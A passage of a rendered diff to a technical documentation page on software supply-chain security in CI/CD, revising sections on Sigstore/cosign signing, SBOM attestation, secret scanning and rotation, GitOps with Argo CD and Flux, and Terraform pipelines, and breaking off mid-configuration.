+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Consumer side: verify that the image was built by a workflow in this org</span>
+gh attestation verify oci://ghcr.io/myorg/app@sha256:... <span class="nt">--owner</span> myorg
+</code></pre></div></div>
 
-<p>Signing answers “is this the exact artifact the build produced, and did <em>we</em> publish it?” Traditionally this meant long-lived GPG/PGP keys that teams had to store, rotate, and inevitably leak. <strong>Sigstore</strong> replaces long-lived keys with <strong>keyless signing</strong>: an ephemeral key pair is minted per-signature, certified against an OIDC identity (your GitHub Actions workload identity, a Google account, etc.) by the <strong>Fulcio</strong> CA, and the signing event is recorded in <strong>Rekor</strong>, a public tamper-evident transparency log. The private key is discarded seconds later — there is nothing long-lived to steal.</p>
+<h3 id="signing-with-sigstore-and-cosign">Signing with Sigstore and cosign</h3>
 
-<p><strong>cosign</strong> is the CLI that drives this for container images and arbitrary blobs:</p>
+<p>Traditional signing relies on long-lived GPG keys that must be stored, rotated, and eventually leak. <strong>Sigstore</strong> uses <strong>keyless signing</strong> instead. An ephemeral key pair is generated per signature. <strong>Fulcio</strong> issues a short-lived certificate binding the public key to an OIDC identity (for CI, the workflow’s identity). The signing event is recorded in <strong>Rekor</strong>, a public, append-only transparency log. The private key is discarded immediately, so there is nothing long-lived to steal.</p>
 
-<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">sign-image</span><span class="pi">:</span>
-  <span class="na">permissions</span><span class="pi">:</span>
-    <span class="na">id-token</span><span class="pi">:</span> <span class="s">write</span>     <span class="c1"># Sigstore OIDC keyless signing</span>
-    <span class="na">packages</span><span class="pi">:</span> <span class="s">write</span>     <span class="c1"># push the signature to the registry</span>
-  <span class="na">steps</span><span class="pi">:</span>
-    <span class="pi">-</span> <span class="na">uses</span><span class="pi">:</span> <span class="s">sigstore/cosign-installer@v3</span>
+<p><strong>cosign</strong> is the Sigstore CLI for containers and blobs. Since <strong>cosign v3</strong> (current release line 3.1.x), signatures are produced in the standardized Sigstore <strong>bundle</strong> format by default. Verification auto-detects old and new formats.</p>
 
-    <span class="c1"># Keyless: identity comes from the GitHub Actions OIDC token,</span>
-    <span class="c1"># certificate from Fulcio, signature logged in Rekor.</span>
-    <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Sign the image</span>
-      <span class="na">run</span><span class="pi">:</span> <span class="s">cosign sign --yes ghcr.io/myorg/app@${IMAGE_DIGEST}</span>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Sign by digest in CI (identity comes from the ambient OIDC token)</span>
+cosign sign <span class="nt">--yes</span> ghcr.io/myorg/app@<span class="s2">"</span><span class="nv">$DIGEST</span><span class="s2">"</span>
 
-    <span class="c1"># Verify before deploy — pin the expected identity and issuer so a</span>
-    <span class="c1"># signature from any other workflow is rejected.</span>
-    <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Verify</span>
-      <span class="na">run</span><span class="pi">:</span> <span class="pi">|</span>
-        <span class="s">cosign verify ghcr.io/myorg/app@${IMAGE_DIGEST} \</span>
-          <span class="s">--certificate-identity-regexp '^https://github.com/myorg/' \</span>
-          <span class="s">--certificate-oidc-issuer https://token.actions.githubusercontent.com</span>
+<span class="c"># Verify before deploy: pin the expected signer identity AND issuer,</span>
+<span class="c"># otherwise any Sigstore-signed image would pass.</span>
+cosign verify ghcr.io/myorg/app@<span class="s2">"</span><span class="nv">$DIGEST</span><span class="s2">"</span> <span class="se">\</span>
+  <span class="nt">--certificate-identity-regexp</span> <span class="s1">'^https://github\.com/myorg/app/\.github/workflows/release\.yml@refs/heads/main$'</span> <span class="se">\</span>
+  <span class="nt">--certificate-oidc-issuer</span> https://token.actions.githubusercontent.com
 </code></pre></div></div>
 
 <blockquote>
-  <p><strong>Always sign and verify by digest (<code class="language-plaintext highlighter-rouge">@sha256:...</code>), never by tag.</strong> Tags are mutable — <code class="language-plaintext highlighter-rouge">:latest</code> can be repointed at a malicious image after you sign the tag. The digest is the content hash, so a signature over a digest is a signature over exactly those bytes. See <a href="../docker/registry.html#image-signing">Docker Registry &amp; Distribution</a> for how digests, tags, and content trust work at the registry level.</p>
+  <p><strong>Sign and verify by digest (<code class="language-plaintext highlighter-rouge">@sha256:...</code>), never by tag.</strong> Tags are mutable, and <code class="language-plaintext highlighter-rouge">:latest</code> can be repointed after signing. The digest is the content hash, so a signature over a digest covers exactly those bytes. See <a href="../docker/registry.html#image-signing">Docker Registry &amp; Distribution</a> for Notation, the CNCF alternative, and registry-level trust.</p>
 </blockquote>
 
-<h3 id="sbom-generation-and-attestation">SBOM Generation and Attestation</h3>
+<h3 id="sboms">SBOMs</h3>
 
-<p>A <strong>Software Bill of Materials</strong> is a complete, machine-readable inventory of every component in an artifact — direct and transitive dependencies, versions, licenses, and hashes. When the next <code class="language-plaintext highlighter-rouge">Log4Shell</code>-class CVE drops, the question “are we affected, and where?” becomes a query against stored SBOMs instead of a frantic codebase audit. The two dominant formats are <strong>SPDX</strong> (ISO standard, license-focused) and <strong>CycloneDX</strong> (OWASP, security-focused); most tools emit both.</p>
+<p>A <strong>Software Bill of Materials</strong> is a machine-readable inventory of every component in an artifact: direct and transitive dependencies, versions, licenses, and hashes. When the next Log4Shell-class vulnerability is disclosed, “are we affected, and where?” becomes a query over stored SBOMs rather than an emergency audit. The two dominant formats are <strong>SPDX</strong> (Linux Foundation, ISO/IEC 5962) and <strong>CycloneDX</strong> (OWASP, ECMA-424). Both are accepted by current regulatory regimes such as the EU Cyber Resilience Act and US federal procurement requirements.</p>
 
-<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">sbom</span><span class="pi">:</span>
-  <span class="na">steps</span><span class="pi">:</span>
-    <span class="c1"># Generate an SBOM from the built image (syft works on images, dirs, archives)</span>
-    <span class="pi">-</span> <span class="na">run</span><span class="pi">:</span> <span class="pi">|</span>
-        <span class="s">syft ghcr.io/myorg/app@${IMAGE_DIGEST} \</span>
-          <span class="s">-o spdx-json=sbom.spdx.json \</span>
-          <span class="s">-o cyclonedx-json=sbom.cdx.json</span>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Generate from the built image</span>
+syft ghcr.io/myorg/app@<span class="s2">"</span><span class="nv">$DIGEST</span><span class="s2">"</span> <span class="nt">-o</span> spdx-json<span class="o">=</span>sbom.spdx.json <span class="nt">-o</span> cyclonedx-json<span class="o">=</span>sbom.cdx.json
 
-    <span class="c1"># Attach the SBOM to the image as a signed attestation, not a loose file.</span>
-    <span class="c1"># An *attestation* binds the SBOM to the image digest and signs the pair,</span>
-    <span class="c1"># so consumers can verify "this SBOM really describes this image."</span>
-    <span class="pi">-</span> <span class="na">run</span><span class="pi">:</span> <span class="pi">|</span>
-        <span class="s">cosign attest --yes \</span>
-          <span class="s">--predicate sbom.spdx.json \</span>
-          <span class="s">--type spdxjson \</span>
-          <span class="s">ghcr.io/myorg/app@${IMAGE_DIGEST}</span>
+<span class="c"># Bind it to the image as a signed attestation (not a loose file anyone could swap)</span>
+cosign attest <span class="nt">--yes</span> <span class="nt">--type</span> spdxjson <span class="nt">--predicate</span> sbom.spdx.json ghcr.io/myorg/app@<span class="s2">"</span><span class="nv">$DIGEST</span><span class="s2">"</span>
 
-    <span class="c1"># Scan the SBOM for known vulnerabilities (decoupled from generation —</span>
-    <span class="c1"># you can re-scan old SBOMs as new CVEs are published, without rebuilding)</span>
-    <span class="pi">-</span> <span class="na">run</span><span class="pi">:</span> <span class="s">grype sbom:sbom.cdx.json --fail-on high</span>
+<span class="c"># Scan the SBOM, now and again whenever new CVEs are published, without rebuilding</span>
+grype sbom:sbom.cdx.json <span class="nt">--fail-on</span> high
 </code></pre></div></div>
 
-<p>The distinction between a <em>file</em> and an <em>attestation</em> matters: a <code class="language-plaintext highlighter-rouge">sbom.json</code> sitting in build artifacts is unsigned and unbound — anyone can swap it. <code class="language-plaintext highlighter-rouge">cosign attest</code> signs the SBOM-plus-digest as a unit and stores it alongside the image in the registry (and in Rekor), so <code class="language-plaintext highlighter-rouge">cosign verify-attestation</code> can later prove the SBOM is authentic and describes that exact image.</p>
+<h3 id="enforcing-at-admission">Enforcing at Admission</h3>
 
-<h3 id="dependency-and-secret-scanning-in-pipelines">Dependency and Secret Scanning in Pipelines</h3>
-
-<p>Provenance proves <em>who built it</em>; scanning proves <em>it isn’t already known to be bad</em>. Both run as <strong>gates</strong> — failing the build rather than merely warning — so a vulnerable dependency or a leaked credential never reaches a registry.</p>
-
-<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">supply-chain-gate</span><span class="pi">:</span>
-  <span class="na">stage</span><span class="pi">:</span> <span class="s">security</span>
-  <span class="na">parallel</span><span class="pi">:</span>
-    <span class="pi">-</span> <span class="na">dependency-vulns</span><span class="pi">:</span>
-        <span class="na">script</span><span class="pi">:</span>
-          <span class="c1"># SCA against your lockfiles + the image's OS packages</span>
-          <span class="pi">-</span> <span class="s">osv-scanner --recursive .</span>
-          <span class="pi">-</span> <span class="s">trivy image --severity HIGH,CRITICAL --exit-code 1 ${IMAGE}</span>
-
-    <span class="pi">-</span> <span class="na">secret-scanning</span><span class="pi">:</span>
-        <span class="na">script</span><span class="pi">:</span>
-          <span class="c1"># Scan full git history, not just the working tree — a secret</span>
-          <span class="c1"># committed and "removed" still lives in earlier commits.</span>
-          <span class="pi">-</span> <span class="s">gitleaks detect --source=. --redact</span>
-          <span class="pi">-</span> <span class="s">trufflehog git file://. --since-commit HEAD~50 --only-verified</span>
-
-    <span class="pi">-</span> <span class="na">license-policy</span><span class="pi">:</span>
-        <span class="na">script</span><span class="pi">:</span>
-          <span class="c1"># Block copyleft/forbidden licenses pulled in transitively</span>
-          <span class="pi">-</span> <span class="s">trivy image --scanners license --severity HIGH ${IMAGE}</span>
-</code></pre></div></div>
-
-<p>Push-time scanning is necessary but reactive; complement it with <strong>pre-receive enforcement</strong> (pre-commit <code class="language-plaintext highlighter-rouge">gitleaks</code> hooks so secrets are caught before they ever land in history) and <strong>continuous re-scanning</strong> of already-published images, since new CVEs are disclosed against artifacts that scanned clean yesterday. Registry-side scanning (Trivy/Grype integrated into the registry, or native scanners like Harbor’s) provides this last line of defense — see <a href="../docker/registry.html#vulnerability-scanning">Docker Registry &amp; Distribution</a> for registry-integrated scanning and admission policy.</p>
-
-<h3 id="secret-rotation">Secret Rotation</h3>
-
-<p>Even well-managed secrets must be assumed to leak eventually; rotation bounds the blast radius by limiting how long a leaked credential is useful. The progression of maturity is:</p>
-
-<ol>
-  <li>
-<strong>Static long-lived secrets, manually rotated</strong> — the floor. Track each secret’s age and fail the pipeline past a policy threshold (the 90-day check shown earlier).</li>
-  <li>
-<strong>Automated rotation via a secrets manager</strong> — Vault, AWS Secrets Manager, or GCP Secret Manager rotates the credential on a schedule and re-issues it to consumers, so no human handles the value.</li>
-  <li>
-<strong>Short-lived dynamic secrets</strong> — the secrets manager mints a credential <em>on demand</em> with a TTL of minutes (e.g. Vault’s database secrets engine creates a per-job DB user that auto-expires). There is no standing secret to rotate.</li>
-  <li>
-<strong>No secrets at all — workload identity / OIDC federation</strong> — the pipeline presents a short-lived OIDC token proving its identity, and the cloud provider exchanges it for scoped, temporary credentials. This is strictly better than rotation: nothing long-lived exists to leak.</li>
-</ol>
-
-<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Keyless cloud auth via OIDC — no stored AWS keys to rotate or leak.</span>
-<span class="na">deploy</span><span class="pi">:</span>
-  <span class="na">permissions</span><span class="pi">:</span>
-    <span class="na">id-token</span><span class="pi">:</span> <span class="s">write</span>     <span class="c1"># mint the OIDC token</span>
-    <span class="na">contents</span><span class="pi">:</span> <span class="s">read</span>
-  <span class="na">steps</span><span class="pi">:</span>
-    <span class="pi">-</span> <span class="na">uses</span><span class="pi">:</span> <span class="s">aws-actions/configure-aws-credentials@v4</span>
-      <span class="na">with</span><span class="pi">:</span>
-        <span class="na">role-to-assume</span><span class="pi">:</span> <span class="s">arn:aws:iam::123456789012:role/deploy-role</span>
-        <span class="na">aws-region</span><span class="pi">:</span> <span class="s">us-east-1</span>
-        <span class="c1"># No aws-access-key-id / aws-secret-access-key — STS issues</span>
-        <span class="c1"># temporary credentials in exchange for the OIDC token.</span>
-</code></pre></div></div>
-
-<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Short-lived dynamic DB credential from Vault (TTL=1h, auto-revoked)</span>
-<span class="pi">-</span> <span class="na">run</span><span class="pi">:</span> <span class="pi">|</span>
-    <span class="s">export VAULT_TOKEN=$(vault write -field=token \</span>
-      <span class="s">auth/jwt/login role=ci jwt="$CI_JOB_JWT")</span>
-    <span class="s">creds=$(vault read -format=json database/creds/app-readonly)</span>
-    <span class="s">export DB_USER=$(echo "$creds" | jq -r .data.username)</span>
-    <span class="s">export DB_PASS=$(echo "$creds" | jq -r .data.password)</span>
-    <span class="s">./run-migrations.sh</span>
-    <span class="s"># Lease expires automatically; nothing persists past the job.</span>
-</code></pre></div></div>
-
-<p>When a <em>static</em> secret must remain, rotate without downtime by overlapping validity: provision the new credential, deploy consumers configured to accept <strong>both</strong> old and new, then revoke the old one once every consumer has rolled. The same dual-key window applies to signing keys — though Sigstore’s keyless model (above) sidesteps signing-key rotation entirely by never holding a long-lived key.</p>
-
-<h2 id="monitoring-and-observability">Monitoring and Observability</h2>
-
-<h3 id="pipeline-metrics">Pipeline Metrics</h3>
-
-<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">collect-metrics</span><span class="pi">:</span>
-  <span class="na">after_script</span><span class="pi">:</span>
-    <span class="pi">-</span> <span class="pi">|</span>
-      <span class="s"># Send metrics to monitoring system</span>
-      <span class="s">curl -X POST https://metrics.api/pipeline \</span>
-        <span class="s">-d '{</span>
-          <span class="s">"pipeline": "$CI_PIPELINE_ID",</span>
-          <span class="s">"duration": "$CI_PIPELINE_DURATION",</span>
-          <span class="s">"status": "$CI_JOB_STATUS",</span>
-          <span class="s">"branch": "$CI_COMMIT_BRANCH"</span>
-        <span class="s">}'</span>
-</code></pre></div></div>
-
-<h3 id="key-metrics-to-track">Key Metrics to Track</h3>
-
-<ol>
-  <li>
-<strong>Lead Time</strong>: Commit to production</li>
-  <li>
-<strong>Deployment Frequency</strong>: Deploys per day/week</li>
-  <li>
-<strong>MTTR</strong>: Mean Time To Recovery</li>
-  <li>
-<strong>Change Failure Rate</strong>: Failed deploys percentage</li>
-</ol>
-
-<h3 id="observability-dashboard-example">Observability Dashboard Example</h3>
-
-<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Grafana dashboard query</span>
-<span class="na">deployment_frequency</span><span class="pi">:</span>
-  <span class="na">query</span><span class="pi">:</span> <span class="pi">|</span>
-    <span class="s">count(</span>
-      <span class="s">ci_pipeline_status{status="success", branch="main"}</span>
-    <span class="s">) by (day)</span>
-
-<span class="na">lead_time_p95</span><span class="pi">:</span>
-  <span class="na">query</span><span class="pi">:</span> <span class="pi">|</span>
-    <span class="s">histogram_quantile(0.95,</span>
-      <span class="s">ci_pipeline_duration_seconds_bucket</span>
-    <span class="s">)</span>
-</code></pre></div></div>
+<p>Signatures and attestations only matter if something checks them. In Kubernetes, an admission controller rejects workloads whose images lack a valid signature or provenance from the expected identity. Options include <strong>Kyverno</strong> (<code class="language-plaintext highlighter-rouge">verifyImages</code> rules), the <strong>Sigstore policy-controller</strong>, and managed equivalents such as GKE Binary Authorization. Start in audit mode, fix what it reports, then enforce, and require digests rather than tags in manifests.</p>
 
 <h2 id="gitops">GitOps</h2>
 
-<p>With GitOps, Git is the single source of truth for both application and infrastructure state. Developers commit changes; a GitOps operator (ArgoCD, Flux) continuously reconciles the cluster to match the repository.</p>
+<p><strong>GitOps</strong> makes Git the source of truth for the desired state of the system. An in-cluster agent continuously <strong>pulls</strong> that state and reconciles the cluster toward it. The CI pipeline never needs cluster credentials. It builds, tests, and publishes an artifact, then commits a change (usually an image digest) to a configuration repository. The <strong>OpenGitOps</strong> principles define the model: desired state is <strong>declarative</strong>, <strong>versioned and immutable</strong>, <strong>pulled automatically</strong>, and <strong>continuously reconciled</strong>.</p>
 
-<h3 id="the-gitops-workflow">The GitOps Workflow</h3>
+<pre><code class="language-mermaid">flowchart LR
+    DEV["Developer"] --&gt;|"PR + merge"| APP[("App repo")]
+    APP --&gt; CI["CI: test, build,&lt;br/&gt;sign, push"]
+    CI --&gt;|"image@sha256"| REG[("Registry")]
+    CI --&gt;|"PR: bump digest"| CFG[("Config repo&lt;br/&gt;(manifests)")]
+    subgraph Cluster
+        OP["Argo CD / Flux"] --&gt;|"apply + reconcile"| K8S["Workloads"]
+    end
+    CFG --&gt;|"pull"| OP
+    REG --&gt;|"pull image"| K8S
+    OP -.-&gt;|"drift detected: revert&lt;br/&gt;to declared state"| K8S
+</code></pre>
 
-<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># 1. Developer commits code</span>
-<span class="s">git add .</span>
-<span class="s">git commit -m "feat</span><span class="err">:</span> <span class="s">add payment processing"</span>
-<span class="s">git push origin feature/payments</span>
+<p>The CI step that hands off to GitOps is a small, reviewable commit:</p>
 
-<span class="c1"># 2. CI pipeline runs tests</span>
-<span class="na">ci-pipeline</span><span class="pi">:</span>
-  <span class="pi">-</span> <span class="s">test</span>
-  <span class="pi">-</span> <span class="s">build</span>
-  <span class="pi">-</span> <span class="s">push-image</span>
-
-<span class="c1"># 3. Update deployment manifest</span>
-<span class="na">update-manifest</span><span class="pi">:</span>
-  <span class="na">script</span><span class="pi">:</span>
-    <span class="pi">-</span> <span class="s">git clone https://github.com/myorg/k8s-configs</span>
-    <span class="pi">-</span> <span class="s">cd k8s-configs</span>
-    <span class="pi">-</span> <span class="s">yq eval '.image.tag = "'$CI_COMMIT_SHA'"' -i app/values.yaml</span>
-    <span class="pi">-</span> <span class="s">git commit -am "Update app to $CI_COMMIT_SHA"</span>
-    <span class="pi">-</span> <span class="s">git push</span>
-
-<span class="c1"># 4. GitOps operator syncs</span>
-<span class="c1"># ArgoCD/Flux automatically deploys changes</span>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># In CI, after pushing the image: bump the digest in the config repo</span>
+git clone <span class="s2">"https://x-access-token:</span><span class="k">${</span><span class="nv">CONFIG_REPO_TOKEN</span><span class="k">}</span><span class="s2">@github.com/myorg/app-config.git"</span>
+<span class="nb">cd </span>app-config/envs/staging
+kustomize edit <span class="nb">set </span>image <span class="s2">"app=ghcr.io/myorg/app@</span><span class="k">${</span><span class="nv">DIGEST</span><span class="k">}</span><span class="s2">"</span>
+git commit <span class="nt">-am</span> <span class="s2">"staging: app -&gt; </span><span class="k">${</span><span class="nv">DIGEST</span><span class="k">}</span><span class="s2">"</span>
+git push   <span class="c"># or open a PR if promotions to this environment require review</span>
 </code></pre></div></div>
 
-<p>The same loop works for Kubernetes manifests authored with <code class="language-plaintext highlighter-rouge">yq</code>/Helm and for declarative Infrastructure as Code (Terraform state committed to Git), so application and infrastructure changes flow through one reviewed, auditable history.</p>
+<p>Practices that hold up at scale:</p>
 
-<h3 id="gitops-best-practices">GitOps Best Practices</h3>
-
-<ol>
-  <li>
-<strong>Separate Config Repo</strong>
-    <div class="language-plaintext highlighter-rouge">
-<div class="highlight"><pre class="highlight"><code>app-code/          # Application source
-app-config/        # Kubernetes manifests
-app-secrets/       # Encrypted secrets (using Sealed Secrets/SOPS)
-</code></pre></div>    </div>
-  </li>
-  <li>
-<strong>Environment Branches</strong>
-    <div class="language-plaintext highlighter-rouge">
-<div class="highlight"><pre class="highlight"><code>main     → production/
-staging  → staging/
-develop  → development/
-</code></pre></div>    </div>
-  </li>
-  <li>
-<strong>Automated Rollback</strong>
-    <div class="language-yaml highlighter-rouge">
-<div class="highlight"><pre class="highlight"><code><span class="na">on-failure</span><span class="pi">:</span>
-  <span class="na">script</span><span class="pi">:</span>
-    <span class="pi">-</span> <span class="s">git revert HEAD</span>
-    <span class="pi">-</span> <span class="s">git push</span>
-    <span class="c1"># GitOps operator automatically rolls back</span>
-</code></pre></div>    </div>
-  </li>
-</ol>
-
-<p><strong>Modern GitOps Tools:</strong></p>
 <ul>
   <li>
-<strong>ArgoCD</strong>: Most popular, great UI, multi-cluster support (with ApplicationSets)</li>
+<strong>Separate config repo (or directory) from app code</strong> so deploy history, access control, and review are independent of application commits.</li>
   <li>
-<strong>Flux v2</strong>: GitOps toolkit, native Kubernetes controller</li>
+<strong>One directory per environment, not one branch per environment.</strong> Environment branches drift, and merges between them are error-prone. Use <code class="language-plaintext highlighter-rouge">envs/dev</code>, <code class="language-plaintext highlighter-rouge">envs/staging</code>, and <code class="language-plaintext highlighter-rouge">envs/prod</code> overlays (Kustomize or Helm values) on a single branch. Promotion is a PR that copies a digest from one directory to the next. Tools such as <strong>Kargo</strong> automate multi-stage promotion.</li>
   <li>
-<strong>Rancher Fleet</strong>: Multi-cluster GitOps at scale</li>
+<strong>Secrets stay encrypted in Git</strong> (SOPS, Sealed Secrets) or are referenced from an external manager via the <strong>External Secrets Operator</strong>.</li>
   <li>
-<strong>Weave GitOps</strong>: Enterprise features, policy management</li>
+<strong>Rollback is <code class="language-plaintext highlighter-rouge">git revert</code>.</strong> The operator reconciles the cluster back. Pair this with progressive delivery (see <a href="deployment.html#progressive-delivery-with-argo-rollouts">Deployment Strategies</a>) for automatic aborts.</li>
+  <li>
+<strong>Keep automated drift correction (self-heal) on in production.</strong> Manual <code class="language-plaintext highlighter-rouge">kubectl edit</code> changes are reverted, which is the point.</li>
 </ul>
 
-<h2 id="infrastructure-as-code-integration">Infrastructure as Code Integration</h2>
+<table>
+  <thead>
+    <tr>
+      <th>Tool</th>
+      <th>Model</th>
+      <th>Notes</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>
+<strong>Argo CD</strong> (CNCF graduated; 3.x line)</td>
+      <td>Application CRDs, web UI, ApplicationSets for fleets</td>
+      <td>Most widely deployed; strong multi-cluster story</td>
+    </tr>
+    <tr>
+      <td>
+<strong>Flux</strong> (CNCF graduated; 2.x line)</td>
+      <td>Composable controllers (source, kustomize, helm, image automation)</td>
+      <td>Kubernetes-native, CLI/CRD-first, no bundled UI</td>
+    </tr>
+    <tr>
+      <td><strong>Rancher Fleet</strong></td>
+      <td>Bundles targeted at cluster groups</td>
+      <td>Designed for very large cluster fleets</td>
+    </tr>
+    <tr>
+      <td><strong>Kargo</strong></td>
+      <td>Promotion orchestration on top of Argo CD</td>
+      <td>Stage-to-stage promotion with verification</td>
+    </tr>
+  </tbody>
+</table>
 
-<h3 id="terraform-in-cicd">Terraform in CI/CD</h3>
+<h2 id="infrastructure-as-code-pipelines">Infrastructure as Code Pipelines</h2>
 
-<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">terraform-pipeline</span><span class="pi">:</span>
-  <span class="na">stages</span><span class="pi">:</span>
-    <span class="pi">-</span> <span class="s">validate</span>
-    <span class="pi">-</span> <span class="s">plan</span>
-    <span class="pi">-</span> <span class="s">apply</span>
+<p>Infrastructure changes use the same pipeline discipline, with one extra rule: <strong>apply exactly the plan that was reviewed</strong>. Generate a saved plan on the PR, show it to reviewers, and apply that plan file (not a fresh plan) after approval.</p>
 
-  <span class="na">validate</span><span class="pi">:</span>
-    <span class="na">script</span><span class="pi">:</span>
-      <span class="pi">-</span> <span class="s">terraform init</span>
-      <span class="pi">-</span> <span class="s">terraform validate</span>
-      <span class="pi">-</span> <span class="s">terraform fmt -check</span>
+<pre><code class="language-mermaid">flowchart LR
+    PR["PR opened"] --&gt; V["fmt + validate&lt;br/&gt;+ lint + policy"]
+    V --&gt; PL["terraform plan -out=tfplan&lt;br/&gt;(post summary to PR)"]
+    PL --&gt; RV{"Review +&lt;br/&gt;approval"}
+    RV --&gt; AP["terraform apply tfplan&lt;br/&gt;(same plan, main only)"]
+</code></pre>
 
-  <span class="na">plan</span><span class="pi">:</span>
-    <span class="na">script</span><span class="pi">:</span>
-      <span class="pi">-</span> <span class="s">terraform plan -out=tfplan</span>
-    <span class="na">artifacts</span><span class="pi">:</span>
-      <span class="na">paths</span><span class="pi">:</span>
-        <span class="pi">-</span> <span class="s">tfplan</span>
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># .gitlab-ci.yml (Terraform or OpenTofu; swap `terraform` for `tofu`)</span>
+<span class="na">stages</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">validate</span><span class="pi">,</span> <span class="nv">plan</span><span class="pi">,</span> <span class="nv">apply</span><span class="pi">]</span>
 
-  <span class="na">apply</span><span class="pi">:</span>
-    <span class="na">script</span><span class="pi">:</span>
-      <span class="pi">-</span> <span class="s">terraform apply tfplan</span>
-    <span class="na">when</span><span class="pi">:</span> <span class="s">manual</span>
-    <span class="na">only</span><span class="pi">:</span>
-      <span class="pi">-</span> <span class="s">main</span>
-</code></pre></div></div>
-
-<h3 id="ansible-integration">Ansible Integration</h3>
-
-<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">ansible-deploy</span><span class="pi">:</span>
-  <span class="na">script</span><span class="pi">:</span>
-    <span class="pi">-</span> <span class="s">ansible-playbook -i inventory/production deploy.yml</span>
+<span class="na">default</span><span class="pi">:</span>
+  <span class="na">image</span><span class="pi">:</span> <span class="s">hashicorp/terraform:1.13</span>
+  <span class="na">id_tokens</span><span class="pi">:</span>
+    <span class="na">CLOUD_ID_TOKEN</span><span class="pi">:</span> <span class="pi">{</span> <span class="nv">aud</span><span class="pi">:</span> <span class="nv">sts.amazonaws.com</span> <span class="pi">}</span>   <span class="c1"># OIDC to the cloud, no stored keys</span>
   <span class="na">before_script</span><span class="pi">:</span>
-    <span class="pi">-</span> <span class="s">ansible-galaxy install -r requirements.yml</span>
-    <span class="pi">-</span> <span class="s">ansible-lint playbooks/</span>
-</code></pre></div></div>
+    <span class="pi">-</span> <span class="s">terraform init -input=false</span>
 
-<h2 id="common-pitfalls-and-troubleshooting">Common Pitfalls and Troubleshooting</h2>
-
-<h3 id="1-flaky-tests">1. Flaky Tests</h3>
-
-<p><strong>Problem</strong>: Tests pass locally but fail in CI</p>
-
-<p><strong>Solutions</strong>:</p>
-<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Bad: Time-dependent test</span>
-<span class="nf">it</span><span class="p">(</span><span class="dl">'</span><span class="s1">expires after 1 hour</span><span class="dl">'</span><span class="p">,</span> <span class="k">async </span><span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
-  <span class="k">await</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">3600000</span><span class="p">);</span>  <span class="c1">// Don't do this!</span>
-  <span class="nf">expect</span><span class="p">(</span><span class="nf">isExpired</span><span class="p">()).</span><span class="nf">toBe</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
-<span class="p">});</span>
-
-<span class="c1">// Good: Mock time</span>
-<span class="nf">it</span><span class="p">(</span><span class="dl">'</span><span class="s1">expires after 1 hour</span><span class="dl">'</span><span class="p">,</span> <span class="k">async </span><span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
-  <span class="kd">const</span> <span class="nx">clock</span> <span class="o">=</span> <span class="nx">sinon</span><span class="p">.</span><span class="nf">useFakeTimers</span><span class="p">();</span>
-  <span class="nx">clock</span><span class="p">.</span><span class="nf">tick</span><span class="p">(</span><span class="mi">3600000</span><span class="p">);</span>
-  <span class="nf">expect</span><span class="p">(</span><span class="nf">isExpired</span><span class="p">()).</span><span class="nf">toBe</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
-  <span class="nx">clock</span><span class="p">.</span><span class="nf">restore</span><span class="p">();</span>
-<span class="p">});</span>
-</code></pre></div></div>
-
-<h3 id="2-secret-leaks">2. Secret Leaks</h3>
-
-<p><strong>Problem</strong>: Accidentally committed secrets</p>
-
-<p><strong>Prevention</strong>:</p>
-<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">pre-commit-check</span><span class="pi">:</span>
+<span class="na">validate</span><span class="pi">:</span>
+  <span class="na">stage</span><span class="pi">:</span> <span class="s">validate</span>
   <span class="na">script</span><span class="pi">:</span>
-    <span class="pi">-</span> <span class="s">gitleaks detect --source=. --verbose</span>
-    <span class="pi">-</span> <span class="s">detect-secrets scan --all-files</span>
-</code></pre></div></div>
+    <span class="pi">-</span> <span class="s">terraform fmt -check -recursive</span>
+    <span class="pi">-</span> <span class="s">terraform validate</span>
+    <span class="pi">-</span> <span class="s">trivy config --exit-code 1 .</span>               <span class="c1"># IaC misconfiguration scan</span>
 
-<h3 id="3-long-build-times">3. Long Build Times</h3>
-
-<p><strong>Problem</strong>: Pipeline takes hours</p>
-
-<p><strong>Solutions</strong>:</p>
-<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Cache dependencies</span>
-<span class="na">cache</span><span class="pi">:</span>
-  <span class="na">key</span><span class="pi">:</span> <span class="s">${CI_COMMIT_REF_SLUG}</span>
-  <span class="na">paths</span><span class="pi">:</span>
-    <span class="pi">-</span> <span class="s">node_modules/</span>
-    <span class="pi">-</span> <span class="s">.npm/</span>
-
-<span class="c1"># Parallel jobs</span>
-<span class="na">test</span><span class="pi">:</span>
-  <span class="na">parallel</span><span class="pi">:</span> <span class="m">4</span>
+<span class="na">plan</span><span class="pi">:</span>
+  <span class="na">stage</span><span class="pi">:</span> <span class="s">plan</span>
   <span class="na">script</span><span class="pi">:</span>
